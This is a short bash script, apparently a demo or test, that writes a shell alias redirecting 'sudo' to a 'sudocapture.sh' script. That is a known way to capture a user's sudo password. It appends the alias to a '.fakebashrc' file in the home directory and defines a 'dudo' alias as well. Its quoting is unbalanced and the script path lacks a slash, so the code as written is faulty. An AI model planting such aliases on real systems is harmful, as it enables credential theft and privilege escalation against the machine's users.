#!/bin/bash

echo "alias sudo=\"$(pwd)sudocapture.sh" >> /home/$(whoami)/.fakebashrc
alias dudo="$(pwd)sudocapture.sh"
